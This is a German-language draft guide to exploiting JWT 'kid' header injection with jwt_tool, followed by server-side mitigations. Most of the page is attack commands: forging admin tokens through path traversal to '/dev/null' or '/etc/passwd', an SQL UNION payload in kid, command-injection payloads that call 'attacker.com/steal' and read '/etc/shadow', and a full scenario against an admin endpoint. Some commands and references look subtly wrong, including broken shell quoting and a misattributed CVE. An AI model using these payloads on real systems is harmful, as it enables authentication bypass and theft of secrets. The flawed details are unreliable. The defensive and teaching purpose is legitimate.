---
title: JWT Kid Parameter Injection Tests mit jwt_tool
description: Ein umfassender Leitfaden zum Ausnutzen und Abschwächen von JWT-kid-Header-Injection-Angriffen mit dem jwt_tool-Sicherheitstoolkit.
created: 2026-06-22
tags:
  - jwt
  - security
  - vulnerability
  - injection
  - jwt_tool
  - testing
status: draft
---

# JWT Kid Parameter Injection Tests mit jwt_tool

## Was ist JWT-Kid-Injection?

Der `kid` (Key ID) ist ein optionaler Header-Parameter, der in RFC 7515 definiert ist und dem Server hilft zu identifizieren, welcher kryptografische Schlüssel zur Überprüfung der JWT-Signatur verwendet werden soll. Wenn eine Anwendung den Verifikationsschlüssel dynamisch auf Basis des nicht bereinigten `kid`-Werts abruft, der vom Angreifer geliefert wird, öffnet dies die Tür für mehrere kritische Angriffe:

- **Path Traversal** – Der Angreifer setzt `kid` auf einen beliebigen Dateipfad (z.B. `/dev/null`, `../../etc/passwd`). Der Server liest diese Datei und verwendet deren rohen Inhalt als HMAC-Geheimnis, was eine Signaturfälschung ermöglicht.
- **SQL-Injection** – Wenn der Schlüssel aus einer Datenbank abgerufen wird (z.B. `SELECT key FROM keys WHERE kid='$kid'`), kann ein Angreifer SQL einschleusen, um einen kontrollierten Wert zurückzugeben.
- **Command-Injection / SSRF** – Selten, tritt aber auf, wenn `kid` unbereinigt an einen Shell-Befehl oder eine ausgehende HTTP-Anfrage übergeben wird.

## Warum es wichtig ist

Eine erfolgreiche `kid`-Injection umgeht die JWT-Authentifizierung vollständig und erlaubt einem Angreifer:

- Token mit beliebigen Payloads zu fälschen (z.B. `"role":"admin"`)
- Privilegien ohne gültige Anmeldeinformationen zu eskalieren
- Benutzerkonten oder Administrationspanels zu übernehmen

Diese Schwachstelle war für mehrere CVEs verantwortlich und bleibt ein fester Bestandteil moderner Webanwendungssicherheitsbewertungen und CTF-Herausforderungen.

## Vorstellung von jwt_tool

`jwt_tool` ist ein leistungsstarkes Open-Source-Toolkit zum Überprüfen, Testen und Fälschen von JSON Web Tokens. Es automatisiert viele gängige JWT-Angriffe, darunter Algorithmusverwirrung, `kid`-Injection, Payload-Manipulation und Umgehung der Signaturprüfung. Entwickelt von [ticarpi](https://github.com/ticarpi/jwt_tool), wird es häufig von Penetrationstestern und Sicherheitsforschern verwendet.

## Installation

### Option 1: Klonen von GitHub (empfohlen)

```bash
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
python3 -m pip install -r requirements.txt
```

Machen Sie das Tool ausführbar:

```bash
chmod +x jwt_tool.py
```

### Option 2: Installation über pip (falls verfügbar)

```bash
pip install jwt-tool
```

> **Hinweis:** Die GitHub-Version wird häufiger aktualisiert. Ziehen Sie immer die neueste Version, wenn Sie aus dem Quellcode arbeiten.

## Grundlegende Verwendung

`jwt_tool` kann als Befehlszeilenwerkzeug mit einem Ziel-JWT aufgerufen werden. Die allgemeine Syntax lautet:

```bash
python3 jwt_tool.py <jwt_token> [options]
```

Für interaktives Scannen:

```bash
python3 jwt_tool.py <jwt_token> -t
```

## Ausnutzen von Kid-Injection mit jwt_tool

### 1. Path Traversal über Kid (am häufigsten)

Der klassische Angriff: Setzen Sie `kid` auf `/dev/null` oder eine beliebige bekannte Datei und signieren Sie das Token mit einem leeren String oder dem Dateiinhalt.

**Schritt 1 – Scannen Sie das JWT und identifizieren Sie den kid-Parameter**

```bash
python3 jwt_tool.py "eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQifQ.eyJzdWIiOiJ1c2VyIiwicm9sZSI6Im1lbWJlciJ9.sjKl7FhBfJ9J3wC6eVkIo4m7kA9nN3g"
```

Die Ausgabe hebt Header- und Payload-Ansprüche hervor, einschließlich `kid`.

**Schritt 2 – Fälschen Sie ein Token mit kid-Injection**

`jwt_tool` bietet das Flag `-X i` für `kid`-Injection-Angriffe. Verwenden Sie `-I`, um den Payload zu bearbeiten, und `-pv`, um einen neuen Wert festzulegen.

```bash
python3 jwt_tool.py "eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQifQ.eyJzdWIiOiJ1c2VyIiwicm9sZSI6Im1lbWJlciJ9.sjKl7FhBfJ9J3wC6eVkIo4m7kA9nN3g" \
  -I \
  -pc "role" -pv "admin" \
  -X i \
  -k "/dev/null"
```

**Erklärung:**
- `-I` : interaktiv Payload-Ansprüche ändern.
- `-pc "role" -pv "admin"` : den Anspruch `role` in `"admin"` ändern.
- `-X i` : `kid`-Injection durchführen.
- `-k "/dev/null"` : `/dev/null` als Schlüsseldatei verwenden. `jwt_tool` signiert das Token mit dem Inhalt dieser Datei (leerer String für `/dev/null`).

Das Tool gibt ein neues, gefälschtes JWT aus, das der Server akzeptiert, wenn er `/dev/null` als Verifikationsschlüssel liest.

**Alternative: Verwendung von `/etc/passwd` als Geheimnis**

```bash
python3 jwt_tool.py <original_token> \
  -I \
  -pc "role" -pv "admin" \
  -X i \
  -k "../../../etc/passwd"
```

Wenn der Server `/etc/passwd` liest, verwendet er dessen gesamten Inhalt als HMAC-Geheimnis. `jwt_tool` signiert automatisch mit diesem Inhalt.

### 2. SQL-Injection über Kid

Wenn der Server die Datenbank mit dem `kid`-Wert nach dem Schlüssel abfragt, können Sie einen SQL-Payload injizieren, um einen bekannten Wert zurückzugeben.

**Beispiel:** Erstellen Sie ein Token mit `kid` gesetzt auf:

```json
{
  "alg": "HS256",
  "kid": " ' UNION SELECT 'known_secret' -- "
}
```

`jwt_tool` hat keinen integrierten Automatismus für SQL-Injection, aber Sie können den Header manuell erstellen und dann mit `-X i` und einem benutzerdefinierten Schlüssel signieren.

**Manuelles Fälschen mit benutzerdefiniertem Header:**

```bash
python3 jwt_tool.py <base_jwt> \
  -X i \
  -k "known_secret" \
  --header '{"alg":"HS256","kid":"' UNION SELECT 'known_secret' -- "}'
```

Passen Sie dann den Payload mit `-I` nach Bedarf an.

### 3. Command-Injection über Kid

Selten, aber möglich, wenn `kid` in einen Shell-Befehl interpoliert wird, z.B.:

```
curl https://keyserver.example.com/keys/$(kid)
```

Setzen Sie `kid` auf einen Command-Injection-Payload:

```json
"kid": "$(curl -s http://attacker.com/steal?)"
```

`jwt_tool` kann beliebige Header-Werte einfügen:

```bash
python3 jwt_tool.py <jwt> \
  --header '{"alg":"RS256","kid":"$(cat /etc/shadow | base64)"}' \
  -X i -k dummy_secret
```

> **Hinweis:** Die Ausnutzung hängt von der Laufzeitumgebung des Servers und der Art der Verarbeitung von `kid` ab.

## Hauptfunktionen von jwt_tool für Kid-Injection

| Funktion | Befehl / Flag | Beschreibung |
|----------|---------------|--------------|
| Kid-Injection-Angriff | `-X i` | Automatisiert den Prozess des Setzens eines gefälschten `kid` und des Signierens mit einem dateibasierten Geheimnis. |
| Algorithmusverwirrung | `-X a` | Kombiniert mit `-X i` für Hybridangriffe (Wechsel von RS256 zu HS256 nach Erhalt des öffentlichen Schlüssels). |
| Payload-Manipulation | `-I` / `-pc` / `-pv` | Ändern Sie interaktiv oder nicht-interaktiv einen beliebigen Anspruch. |
| Benutzerdefinierte Schlüsseldatei | `-k <datei>` | Gibt die Datei an, deren Inhalt beim Fälschen als HMAC-Geheimnis verwendet wird. |
| Signatur-Abweichungsanalyse | `-S` / `-s` | Überprüfen des Token-Verhaltens mit veränderten Signaturen. |
| Datenbank bekannter JWT-Geheimnisse | `-C` | Versucht gängige schwache Geheimnisse während des Brute-Force-Angriffs. |
| Erweiterte Header-Manipulation | `--header` | Fügt beliebiges JSON in den Header ein (nützlich für rohe `kid`-Payloads). |

## Alles zusammenführen: Vollständiges Ausnutzungsszenario

Betrachten Sie eine verwundbare API, die JWT zur Authentifizierung verwendet. Der Server ruft den Verifikationsschlüssel ab, indem er die in `kid` angegebene Datei liest:

```python
# Vulnerable pseudocode
def verify_token(token):
    header = decode_header(token)
    kid = header['kid']
    with open('/keys/' + kid, 'r') as f:
        secret = f.read()
    return jwt.decode(token, secret, algorithms=['HS256'])
```

**Schritt 1 – Aufklärung**

```bash
python3 jwt_tool.py "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6ImNsaWVudCJ9.eyJzdWIiOiJ1c2VyIn0.QPx..."
```

Die Ausgabe zeigt `alg: RS256`, `kid: client`.

**Schritt 2 – Überprüfen, ob Path Traversal möglich ist**

Versuch, auf `/dev/null` zuzugreifen:

```bash
python3 jwt_tool.py <token> -X i -k /dev/null
```

Wenn der Server eine 200-Antwort mit dem gefälschten Token zurückgibt, ist die Schwachstelle bestätigt.

**Schritt 3 – Privilegien eskalieren**

```bash
# Forge token with admin role
python3 jwt_tool.py <original> \
  -I \
  -pc "role" -pv "admin" \
  -X i \
  -k "/dev/null"
```

**Schritt 4 – Verwenden Sie das gefälschte Token, um auf geschützte Ressourcen zuzugreifen**

```bash
curl -H "Authorization: Bearer <forged_token>" https://api.target.com/admin
```

## Absicherungsstrategien (Serverseite)

1. **Whitelist zulässiger Kid-Werte** – Harten Sie eine Zuordnung bekannter `kid`-Zeichenfolgen zu ihren entsprechenden öffentlichen Schlüsseln fest. Leiten Sie den Schlüssel niemals von Benutzereingaben ab.
2. **Kid-Format validieren** – Wenn eine dynamische Suche unvermeidlich ist, erzwingen Sie strenge Formatprüfungen: nur alphanumerisch, Pfadtrennzeichen ablehnen (`.` , `/`), verdächtige Zeichen ablehnen.
3. **Hartcodierte Schlüssel verwenden** – Der sicherste Ansatz ist, den erwarteten öffentlichen Schlüssel in den Anwendungscode oder eine Konfigurationsdatei einzubetten.
4. **Algorithmusdurchsetzung erzwingen** – Überprüfen Sie immer, ob der im Token verwendete Algorithmus dem erwarteten Algorithmus für diesen Aussteller entspricht. Vertrauen Sie nicht dem `alg`-Header.
5. **Eine JWT-Bibliothek mit integriertem Schutz verwenden** – Moderne Bibliotheken wie `PyJWT`, `jsonwebtoken` und `jose` können so konfiguriert werden, dass sie unbekannte `kid`-Werte ablehnen oder einen statischen Schlüsselsatz erfordern.

## Fazit

`jwt_tool` ist ein unverzichtbares Werkzeug zum Testen von JWT-`kid`-Injection-Schwachstellen. Es automatisiert die gängigsten Ausnutzungspfade und bietet einen klaren, wiederholbaren Arbeitsablauf für Sicherheitstester. Das Verständnis der Verwendung der Flags `-X i` und `-I` kann den Unterschied zwischen einem übersehenen Befund und einer kritischen Authentifizierungsumgehung ausmachen.

Denken Sie immer daran, `kid` auf der Serverseite als **nicht vertrauenswürdige Eingabe** zu behandeln. Für Entwickler können ein paar Zeilen Eingabevalidierung eine ganze Klasse von JWT-Angriffen eliminieren.

## Referenzen

- [github.com/ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
- [RFC 7515 – JSON Web Signature](https://datatracker.ietf.org/doc/html/rfc7515)
- [JWT Attacks (Part 4c): kid Header Injection](https://jwt.io/introduction/)
- [CVE-2018-0114](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0114) – node-jsonwebtoken key confusion
- [PortSwigger JWT Kid Lab](https://portswigger.net/web-security/jwt)